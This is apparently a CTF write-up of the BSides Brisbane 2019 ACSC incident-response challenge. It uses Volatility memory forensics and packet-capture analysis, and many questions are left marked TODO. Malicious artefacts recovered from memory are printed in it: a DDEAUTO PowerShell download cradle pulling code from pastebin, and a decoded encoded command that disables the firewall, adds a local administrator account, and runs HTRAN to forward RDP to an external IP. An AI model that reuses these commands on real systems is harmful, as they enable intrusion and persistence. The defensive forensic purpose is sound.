---
layout: post
title: "BSides Brisbane 2019 ACSC IR Challenge"
description: "BSides Brisbane 2019 ACSC IR Challenge"
category: ctf, bsides_brisbane_2019, forensics, acsc, ir, write-up
tags: [ctf, bsides_brisbane_2019, forensics, acsc, ir, write-up]
---


### GS-1 (25pts) ###
```text
What is the MD5 hash of the provided memory dump?
```
Flag:

```shell
$ md5sum memdump.raw
81926e158040e7926e485f7150173795  memdump.raw
```

### GS-2 (25pts) ###
```text
When was the memory dump captured (in UTC)?

FLAG FORMAT: YYYY-MM-DD HH:MM:SS
```

This was found using imageinfo.

```shell
$ volatility -f memdump.raw imageinfo
Volatility Foundation Volatility Framework 2.6.1
INFO    : volatility.debug    : Determining profile based on KDBG search...
          Suggested Profile(s) : Win7SP1x64, Win7SP0x64, Win2008R2SP0x64, Win2008R2SP1x64_23418, Win2008R2SP1x64, Win7SP1x64_23418
                     AS Layer1 : WindowsAMD64PagedMemory (Kernel AS)
                     AS Layer2 : FileAddressSpace (/bsides2019/memdump.raw)
                      PAE type : No PAE
                           DTB : 0x187000L
                          KDBG : 0xf80002a31120L
          Number of Processors : 1
     Image Type (Service Pack) : 1
                KPCR for CPU 0 : 0xfffff80002a33000L
             KUSER_SHARED_DATA : 0xfffff78000000000L
           Image date and time : 2019-03-08 04:22:41 UTC+0000
```

For the rest of the write up I'll be using the following volatilityrc config file to analyse the memory dump.

```ini
[DEFAULT]
PROFILE=Win7SP1x64_24000
LOCATION=file:///bsides2019/memdump.raw
KDBG=0xf80002a31120
```

Flag:

```
2019-03-08 04:22:41
```


### GS-3 (25pts) ###
```text
What is the MD5 hash of the provided packet capture?
```
Flag:

```shell
$ md5sum packetcapture.pcap
a9041f0a645ef94d6d88fd27459caf18  packetcapture.pcap
```

### GS-4 (25pts) ###
```text
What is the average packet rate per second?

FLAG FORMAT: Number
```

<img src="{{site.url}}/assets/2019-08-13-bsides-canberra-2019-acsc-ir-challenge-write-up-GS-4.png">

Flag:

```
58
```

### UD-1 (50pts) ###
```text
Elliot later admitted that at the recent renewable energy conference held in Adelaide he got some free merchandise - one of which, a fancy USB key, he tried out at work.

What is the serial number of this device?
```

I used the usbstor volatility plugin to list all previously connected USB drives.

```shell
$ volatility usbstor
Reading the USBSTOR Please Wait
Found USB Drive: 08F0B550E0F29A32&0
        Serial Number:  08F0B550E0F29A32&0
        Vendor: VBTM
        Product:        Store_'n'_Go
        Revision:       1.04
        ClassGUID:      Store_'n'_Go

        ContainerID:    {219ec5df-142f-552f-be1b-fa44c0191019}
        Mounted Volume: Unknown
        Drive Letter:   Unknown
        Friendly Name:  VBTM Store 'n' Go USB Device
        USB Name:       Unknown
        Device Last Connected:  2019-03-08 03:01:32 UTC+0000

        Class:  DiskDrive
        Service:        disk
        DeviceDesc:     @disk.inf,%disk_devdesc%;Disk drive
        Capabilities:   16
        Mfg:    @disk.inf,%genmanufacturer%;(Standard disk drives)
        ConfigFlags:    0
        Driver: {4d36e967-e325-11ce-bfc1-08002be10318}\0001
        Compatible IDs:
                USBSTOR\Disk
                USBSTOR\RAW


        HardwareID:
                USBSTOR\DiskVBTM____Store_'n'_Go____1.04
                USBSTOR\DiskVBTM____Store_'n'_Go____
                USBSTOR\DiskVBTM____
                USBSTOR\VBTM____Store_'n'_Go____1
                VBTM____Store_'n'_Go____1
                USBSTOR\GenDisk
                GenDisk


Windows Portable Devices
```
Flag:

```
08F0B550E0F29A32
```

### UD-2 (50pts) ###
```text
Elliot also admitted that the device already had something on it. Curiosity got the better of him and he opened it.

What was the name of this file?

FLAG FORMAT: filename.extension
```

I was able to find the file that was open by using the filescan plugin to scan for any files which will list files which were open at the time of the memory dump. It's possible to identify files which were on an USB drive by looking at the device path. In this case HarddiskVolume3 is the USB drive.

```shell
$ volatility filescan
...
0x000000011ce4cdc0     16      0 R--rwd \Device\HarddiskVolume3\Internal Contact List.docx
...
```
Flag:

```
Internal Contact List.docx
```

### UD-3 (50pts) ###
```text
When was this file opened (in UTC)?

FLAG FORMAT: YYYY-MM-DD HH:MM:SS
```

I was able to find when the document was opened by looking for any Microsoft Word processes which were launched to open the document and then looking for the processes launch time.

```shell
$ volatility cmdline
...
WINWORD.EXE pid:   1572
Command line : "C:\Program Files\Microsoft Office\Office15\WINWORD.EXE" /n "E:\Internal Contact List.docx
...
$ volatility pstree
...
. 0xfffffa8003f263e0:WINWORD.EXE                     1572    832     20    877 2019-03-08 03:02:41 UTC+0000
...
```
Flag:

```
2019-03-08 03:02:41
```

### UD-4 (75pts) ###
```text
What company did the author of the file belong to (according to the file's metadata)?

FLAG FORMAT: Company_name
```

I initially tried to dump a copy of "Internal Contact List.docx" using volatility's dumpfiles plugin. Unfortunately it appears that the file was not cached.
```
$ vol.py dumpfiles -D dumpfiles -n
DataSectionObject 0xfffffa800623a6c0   1572   \Device\HarddiskVolume2\Program Files\Microsoft Office\Office15\MSWORD.OLB
SharedCacheMap 0xfffffa800623a6c0   1572   \Device\HarddiskVolume2\Program Files\Microsoft Office\Office15\MSWORD.OLB
DataSectionObject 0xfffffa800665f070   1572   \Device\HarddiskVolume2\Windows\System32\en-US\msxml6r.dll.mui
...
```

My next strategy was too find out how Microsoft Office stores the company name in the metadata of office documents. I analysed the follow sample docx [file](http://www.dhs.state.il.us/OneNetLibrary/27897/documents/Initiatives/IITAA/Sample-Document.docx) and noted that the compnay name is stored between the Company tags in docProps/app.xml
```xml
<Properties xmlns="http://schemas.openxmlformats.org/officeDocument/2006/extended-properties" xmlns:vt="http://schemas.openxmlformats.org/officeDocument/2006/docPropsVTypes"><Template>Normal.dotm</Template><TotalTime>27</TotalTime><Pages>2</Pages><Words>423</Words><Characters>2416</Characters><Application>Microsoft Office Word</Application><DocSecurity>0</DocSecurity><Lines>20</Lines><Paragraphs>5</Paragraphs><ScaleCrop>false</ScaleCrop><HeadingPairs><vt:vector size="2" baseType="variant"><vt:variant><vt:lpstr>Title</vt:lpstr></vt:variant><vt:variant><vt:i4>1</vt:i4></vt:variant></vt:vector></HeadingPairs><TitlesOfParts><vt:vector size="1" baseType="lpstr"><vt:lpstr></vt:lpstr></vt:vector></TitlesOfParts><Company>State of Illinois</Company><LinksUpToDate>false</LinksUpToDate><CharactersWithSpaces>2834</CharactersWithSpaces><SharedDoc>false</SharedDoc><HyperlinksChanged>false</HyperlinksChanged><AppVersion>14.0000</AppVersion></Properties>
```

I proceeded to run strings over the memory dump and grep for the Company tag.
I finally ran the volatility strings plugin to confirm that the match was from the Microsoft Word process(PID 832)

```shell
$ strings -a -td memdump.raw > memdump.strings.txt
$ strings -a -td -el memdump.raw >> memdump.strings.txt
$ grep '<Company>' memdump.strings.txt > strings.search.txt
$ vol.py strings -s memdump.strings.txt
Volatility Foundation Volatility Framework 2.6.1
1548921801 [832:03a99bc9] <Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/ex
tended-properties" Target="docProps/app.xml"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/package/2006/relationships/metadata/core-properties" Target="docProps/core.xml"/><Relationship Id="r
Id1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/></Relationships>iant><vt:variant><vt:i4>1</vt:i4></vt:variant></vt:vector></HeadingPair
s><TitlesOfParts><vt:vector size="1" baseType="lpstr"><vt:lpstr></vt:lpstr></vt:vector></TitlesOfParts><Manager>C Robinson</Manager><Company>UVetcha</Company><LinksUpToDate>false</LinksUpToDate><CharactersWithS
paces>398</CharactersWithSpaces><SharedDoc>false</SharedDoc><HyperlinksChanged>false</HyperlinksChanged><AppVersion>15.0000</AppVersion></Properties>nk" xmlns:wne="http://schemas.microsoft.com/office/word/2006/
wordml" xmlns:wps="http://schemas.microsoft.com/office/
```



Flag:

```
UVetcha
```

### UD-5 (100pts) ###
```text
We know Elliot admitted to opening the file, but as a professional Incident Responder we should confirm this.

What is the Security Identifier (SID) of the account that opened the file?
```

It's possible to find the SID for the user that opened the file by looking at all of the handles of the Microsoft Word process. In the handle listing there are registry key paths which contains the user's SID.

```shell
$ volatility handles -p 1572
Offset(V)             Pid             Handle             Access Type             Details
------------------ ------ ------------------ ------------------ ---------------- -------
...
0xfffff8a0021fdc50   1572               0x6c            0xf003f Key              USER\S-1-5-21-3760583606-2817717872-3306295709-2146
...
```

Flag:

```
S-1-5-21-3760583606-2817717872-3306295709-2146
```

### IA-1 (50pts) ###
```text
Completely unrelated and distracting to the crisis at hand, Elliot verbosely informs you that he is heading over to Sydney and was checking out the weather - around about the time he plugged in the device.

What was the forecast for Sydney?

FLAG FORMAT: The forecast (two words)
```

I done some initial analysis of the packet capture and noticed that the user had visited Bureau of Meteorology website. I proceeded to load the packet capture into Network Miner to carve out all files. Looking through the files for hosts 23.210.81.33 and 23.49.219.210 we can see carved Bureau of Meteorology web pages.

Flag:

```
Mostly sunny
```

### IA-2 (75pts) ###
```text
Elliot recalled that he had to say yes to 'lots of popups' to actually see the file's contents.

What was the 'reason' given in the the very last popup to entice Elliot to accept?

FLAG FORMAT: A_single_word
```

Since we don't have a copy of the original file for analysis, I proceeded to dump the memory of the Microsoft Word process to review. Unfortunately I was unable to find any information.
I proceed to review the strings in the memory dump. I found the following DDEAUTO string which is likely the initial source of compromise.

```
3722809856 DDEAUTO "c:\\Programs\\Microsoft\\Office\MSWord.exe\\..\\..\\..\\..\\windows\\system32\\cmd.exe /k powershell.exe -c $e=(New-Object System.Net.WebClient).DownloadString('https://pastebin.com/raw/04jth0B0'); powershell $e # " "for security reasons"  !Syntax Error, C
```

I checked the location of this string using the strings volatility plugin which showed that it was in kernel space. It's likely a cached copy of the word document or a fragment.
```
$ grep 'DDEAUTO ' memdump.strings.txt > strings.search.txt
$ vol.py strings -s memdump.strings.txt
Volatility Foundation Volatility Framework 2.6.1
3722809856 [kernel:f98083cc1200] DDEAUTO "c:\\Programs\\Microsoft\\Office\MSWord.exe\\..\\..\\..\\..\\windows\\system32\\cmd.exe /k powershell.exe -c $e=(New-Object System.Net.WebClient).DownloadString('https://pastebin.com/raw/04jth0B0'); powershell $e # " "for security reasons"  !Syntax Error, C
```

Flag:

```
for security reasons
```

### IA-3 (75pts) ###
```text
Accepting the popups initiated a request to an external host which returned some suspicious 'data'.

This data appears to have been recently created on the external host. When was it created (in UTC)?

FLAG FORMAT: YYYY-MM-DD HH:MM:SS
```

Flag:

#### TODO ####

### IA-4 (75pts) ###
```text
Suspicious data indeed, more like commands! Looks like some dodgy file is downloaded.

What was the URL to download this file?

FLAG FORMAT: https://the.full.url.to.dl.the.malware
```

From IA-2 the DDE command executes a powershell download cradle.
```
"c:\\Programs\\Microsoft\\Office\MSWord.exe\\..\\..\\..\\..\\windows\\system32\\cmd.exe /k powershell.exe -c $e=(New-Object System.Net.WebClient).DownloadString('https://pastebin.com/raw/04jth0B0'); powershell $e # " "for security reasons"
```

Flag:

```
https://pastebin.com/raw/04jth0B0
```

### IA-5 (100pts) ###
```text
Looks like this dodgy file, let's call it malware, gets triggered (and repeatedly) due to a script which doesn't look familiar to any of the system admins.

What is the MD5 hash of this script?

FLAG FORMAT: MD5
```

I was unable to recover a copy of c:\windows\temp\runkwhours.ps1 using Volatility's dumpfiles plugin likely because the file is no longer cached.
I tried dumping the memory of the parent processes of kwhours.xls to look for the original file but was unsuccessful. I then reviewed the strings from the memory dump and noticed the following strings which are likely the original contents.
ell script is likely:

```
2231492610 start-process -FilePath C:\windows\temp\kwhours.xls -wait -NoNewWindow -ArgumentList power-telemetry.energy,443
2852565410 start-process -FilePath C:\windows\temp\kwhours.xls -wait -NoNewWindow -ArgumentList power-telemetry.energy,443
```

Running the volatility strings plugins over the matched strings shows that one is from free memory and the other from kernel.
```
$ vol.py strings -s strings.scans.runkwhours.ps1.txt | tee -a strings.runkwhours.ps1.txt
Volatility Foundation Volatility Framework 2.6.1
2231492610 [FREE MEMORY:-1] start-process -FilePath C:\windows\temp\kwhours.xls -wait -NoNewWindow -ArgumentList power-telemetry.energy,443
2852565410 [kernel:f9804df6b1a2] start-process -FilePath C:\windows\temp\kwhours.xls -wait -NoNewWindow -ArgumentList power-telemetry.energy,443
```

Flag:

```shell
$ md5sum runkwhours.ps1
f505465798e1c32cd3dbdeb237878da0  runkwhours.ps1
```

### MD-1 (75pts) ###
```text
Usually the firewall is enabled but now it's not! This doesn't match our Standard Operating Environment (SOE) for those hosts!

The bad guy or 'actor' must have done it!

When was the firewall disabled (in UTC)?

FLAG FORMAT: YYYY-MM-DD HH:MM:SS
```

Flag:

#### TODO ####

### MD-2 (100pts) ###
```text
More weirdness! The actor created an account - possibly as a backdoor.

What is the username and password for this account.

FLAG FORMAT: username:password
```

When reviewing the strings in the memory dump, I came across the following powershell one liner.

```
$ grep EncodedCommand memdump.strings.txt
428546096 C:\Windows\system32\cmd.exe /c powershell.exe -noprofile -EncodedCommand DQAKAG4AZQB0AHMAaAAgAGEAZAB2AGYAaQByAGUAdwBhAGwAbAAgAHMAZQB0ACAAYQBsAGwAcAByAG8AZgBpAGwAZQAgAHMAdABhAHQAZQAgAG8AZgBmAA0ACgANAAoATgBFAFQAIABVAFMARQBSACAAIgBTAG8AbgBuAHkAQgBvAHkAIgAgACIAVQBWAHIAYQB5ADEAIQBAACMAIgAgAC8AQQBEAEQADQAKACAAIAANAAoATgBFAFQAIABMAE8AQwBBAEwARwBSAE8AVQBQACAAIgBBAGQAbQBpAG4AaQBzAHQAcgBhAHQAbwByAHMAIgAgACIAUwBvAG4AbgB5AEIAbwB5ACIAIAAvAEEARABEACAADQAKAA0ACgAkAHUAcgBsACAAPQAgACIAaAB0AHQAcABzADoALwAvAHAAYQBzAHQAZQBiAGkAbgAuAGMAbwBtAC8AcgBhAHcALwBLAHMATgBKAEEAbgA5AHQAIgANAAoAJABvAHUAdABwAHUAdAAgAD0AIAAiAFMAZQByAHYAaQBjAGUAQwBvAG4AdAByAGEAYwB0AC4AeABsAHMAIgANAAoADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAkAHYAYQByACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJAB1AHIAbAApAA0ACgBXAHIAaQB0AGUALQBIAG8AcwB0ACAADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAkACgAWwBJAE8ALgBGAGkAbABlAF0AOgA6AFcAcgBpAHQAZQBBAGwAbABCAHkAdABlAHMAKAAkAG8AdQB0AHAAdQB0ACwAIABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACQAdgBhAHIAKQApACkADQAKAFcAcgBpAHQAZQAtAEgAbwBzAHQAIAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACQAKABTAHQAYQByAHQALQBQAHIAbwBjAGUAcwBzACAALQBGAGkAbABlAFAAYQB0AGgAIAAkAG8AdQB0AHAAdQB0ACAALQBXAGEAaQB0ACAALQBOAG8ATgBlAHcAVwBpAG4AZABvAHcAIAAtAEEAcgBnAHUAbQBlAG4AdABMAGkAcwB0ACAAJwAtAHMAbABhAHYAZQAnACwAJwAxADMALgAyADEAMQAuADIAMAA0AC4AMgAxACcALAAnADIANwAyADcAJwAsACcAMQAyADcALgAwAC4AMAAuADEAJwAsACcAMwAzADgAOQAnACkADQAKAA== 
```

Decoding the base64 string gives us a set of commands.
The commands will do the following:
* Disable the local firewall
* Add a new local administrator account
* Download and execute a program which will likely setup a port forward.

```
$ echo -en <base64 string> | base64 -d | strings -el

netsh advfirewall set allprofile state off
NET USER "SonnyBoy" "UVray1!@#" /ADD
NET LOCALGROUP "Administrators" "SonnyBoy" /ADD
$url = "https://pastebin.com/raw/KsNJAn9t"
$output = "ServiceContract.xls"
           $var = (New-Object System.Net.WebClient).DownloadString($url)
Write-Host
           $([IO.File]::WriteAllBytes($output, [Convert]::FromBase64String($var)))
Write-Host
           $(Start-Process -FilePath $output -Wait -NoNewWindow -ArgumentList '-slave','13.211.204.21','2727','127.0.0.1','3389')
```

Flag:

```
SonnyBoy:UVray1!@#
```

### MD-3 (100pts) ###
```text
The actor then downloaded yet another tool. A quick assessment reveals it's likely used to assist in native remote controlling of the host!

What was the full path this tool was saved to disk?

FLAG FORMAT: C:\full\path\to\tool.extension
```

In the powershell script, the following snippet downloads the executable and saves it as "ServiceContract.xls"

```powershell
$url = "https://pastebin.com/raw/KsNJAn9t"
$output = "ServiceContract.xls"
           $var = (New-Object System.Net.WebClient).DownloadString($url)
Write-Host
           $([IO.File]::WriteAllBytes($output, [Convert]::FromBase64String($var)))
Write-Host
           $(Start-Process -FilePath $output -Wait -NoNewWindow -ArgumentList '-slave','13.211.204.21','2727','127.0.0.1','3389')
```

If you search the results of the volatility filescan plugin for ServiceContract.xls you will get the full path to the executable.

```shell
$ volatility filescan
Offset(P)            #Ptr   #Hnd Access Name
------------------ ------ ------ ------ ----
...
0x000000011f5bcf20      7      0 R--r-d \Device\HarddiskVolume2\Windows\SysWOW64\ServiceContract.xls
...
```

Flag:

```
C:\Windows\SysWOW64\ServiceContract.xls
```

### MD-4 (100pts) ###
```text
We should pass on more details to our threat intel provider to get more information about this tool. They've asked for a sample, or a least the hash.

What is the MD5 hash of this tool?

FLAG FORMAT: MD5
```

I was unable to recover a copy of the ServiceContract.xls file as it was paged out.
```
$ vol.py procdump -p 5636 -D dumpfiles
Volatility Foundation Volatility Framework 2.6.1
Process(V)         ImageBase          Name                 Result
------------------ ------------------ -------------------- ------
0xfffffa80067c5800 0x0000000000fe0000 ServiceContrac       Error: ImageBaseAddress at 0xfe0000 is unavailable (possibly due to paging)
$ vol.py procdump -p 5032 -D dumpfiles
Volatility Foundation Volatility Framework 2.6.1
Process(V)         ImageBase          Name                 Result
------------------ ------------------ -------------------- ------
0xfffffa8006841a00 0x0000000000fe0000 ServiceContrac       Error: ImageBaseAddress at 0xfe0000 is unavailable (possibly due to paging)
```

Flag:

#### TODO ####

### MD-5 (125pts) ###
```text
Threat intelligence hasn't come back to you but the bosses want to know what that tool does now.

*** analysis montage... zoom...enhance ***

Oh, this is a publicly known tool, some nice reporting available too!

What is the abbreviated name that this tool is publicly known as?

FLAG FORMAT: Abbreviated_name
```

Since I didn't have a copy of ServiceContract.xls, I proceed to dump the memory of the two ServiceContract.xls processes. I proceeded to look for strings in the process memory to identify what the tool maybe. Googling "HUC Packet Transmit Tool" shows that the tool is commonly referred to as [HTRAN](https://attack.mitre.org/software/S0040/)
```
[-] ERROR: Must supply logfile name.
[-] ERROR: open logfile
====== Start ======
-listen
-tran
-slave
1.00
[Usage of Packet Transmit:]
 %s -<listen|tran|slave> <option> [-log logfile]
======================== HUC Packet Transmit Tool V%s =======================
=========== Code by lion & bkbll, Welcome to http://www.cnhonker.com ==========
[option:]
 -listen <ConnectPort> <TransmitPort>
 -tran   <ConnectPort> <TransmitHost> <TransmitPort>
 -slave <ConnectHost> <ConnectPort> <TransmitHost> <TransmitPort>
```

```
```

Flag:

```
HTRAN
```
#### LM-1 (75pts) ####

### Template ###
```text
Leveraging the publicly known tool identified earlier, the actor remotely authenticated to the host via RDP.

When did this happen?

FLAG FORMAT: YYYY-MM-DD HH:MM:SS
```

Flag:

#### TODO ####

### LM-2 (75pts) ###
```text
What is the machine name of the computer used by the actor to initiate the RDP?
```

In the memory dump there is a open RDP session. I dumped one of the process memory from that RDP session and looked for the CLIENTNAME environment variable. The CLIENTNAME set the the hostname of the remote system in an RDP session.

```
$ vol.py memdump -p 4092 -D dumpfiles
Volatility Foundation Volatility Framework 2.6.1
************************************************************************
Writing Everything.exe [  4092] to 4092.dmp
$ strings 4092.dmp | grep CLIENTNAME
CLIENTNAME=WIN-A1JOJAD5TS5
```

Flag:

```
WIN-A1JOJAD5TS5
```
#### TODO ####

### LM-3 (75pts) ###
```text
RDP inception! The actor then RDP'd to the Domain Controller.

When did this happen?

FLAG FORMAT: YYYY-MM-DD HH:MM:SS
```

Flag:

#### TODO ####

### LT-1 (50pts) ###
```text
Now on the Domain Controller, the actor began reconnaissance activities.

What was the IP address of the Domain Controller?

FLAG FORMAT: IP_address
```

Flag:

#### TODO ####

### LT-2 (75pts) ###
```text
The actor performed network reconnaissance, searching for a particular device.

What command did the actor leveraged to do this reconnaissance? Do not include any arguments that may have been used.

FLAG FORMAT: command
```

Flag:

#### TODO ####

### LT-3 (75pts) ###
```text
Target located. What was the sole IP address that responded to this reconnaissance?

FLAG FORMAT: IP_addresss
```

Flag:

#### TODO ####

### LT-4 (125pts) ###
```text
The results of the actors reconnaissance activities were compressed into a single file, ready for exfiltration.

When was this file created?

FLAG FORMAT: YYYY-MM-DD HH:MM:SS
```

Flag:

#### TODO ####

### LT-5 (150pts) ###
```text
How many domain accounts are provisioned? The actor knows... probably.

FLAG FORMAT: Number
```

Flag:

#### TODO ####

### DD-1 (50pts) ###
```text
What packer type was used on the malware (ignoring versioning)?

FLAG FORMAT: packer_type
```

Flag:

#### TODO ####

### DD-2 (75pts) ###
```text
When was the malware built/compiled?

FLAG FORMAT: YYYY-MM-DD HH:MM:SS
```

Flag:

#### TODO ####

### DD-3 (100pts) ###
```text
What was the language used to develop the malware (prior to compilation)?
```

Flag:

#### TODO ####

### DD-4 (100pts) ###
```text
What password is required to communicate with the Command and Control (C2) server?

FLAG FORMAT: password
```

I was able to find a URL which contained the C2 domain. The password is likely the argument for pw.
```
$ grep power-telemetry.energy memdump.strings.txt
...
3444930516 https://power-telemetry.energy/scv?pw=11xIec1T5PehN62nHiVyK1Kora5&debug=false&cmd=fetchtask
...
```

Flag:

```
11xIec1T5PehN62nHiVyK1Kora5
```

### DD-5 (100pts) ###
```text
What Organisation Unit (OU) was set in the SSL certificate that was installed on the C2 server (during the incident timeframe)?

FLAG FORMAT: Organisation Unit
Hint! Actors make spelling mistakes too.
```

I loaded the provided packet capture in NetworkMiner which carved out any observed SSL certificates. Looking at the SSL certificates for power-telemetry.energy shows only one SSL certificate. I then used the following openssl command to read the SSL certificate details.

```
$ openssl x509 -in power-telemetry.energy.cer -inform DER -text | grep OU
Issuer: C = OT, ST = OT State, L = OT City, O = OT Widgits FTW, OU = Dark Engery, CN = power-telemetry.energy, emailAddress = root@power-telemetry.energy
Subject: C = OT, ST = OT State, L = OT City, O = OT Widgits FTW, OU = Dark Engery, CN = power-telemetry.energy, emailAddress = root@power-telemetry.energy
```

Flag:

```
Dark Engery
```

### TR-1 (75pts) ###
```text
What is the MD5 hash of the WIND Corp logo?
```

Flag:

#### TODO ####

### TR-2 (100pts) ###
```text
What is the initial status of the turbine the actor targeted?

FLAG FORMAT: Status:Number:Number
```

Flag:

#### TODO ####

### TR-3 (200pts) ###
```text
The details for this challenge will be displayed only after TR-2 in the 8. Turbine Repairs category has been solved (by any team).
```

Flag:

#### TODO ####

### RA-1 (200pts) ###
```text
Who is responsible for the attack against WIND corp?

FLAG FORMAT: The actor responsible
```

Flag:

#### TODO ####
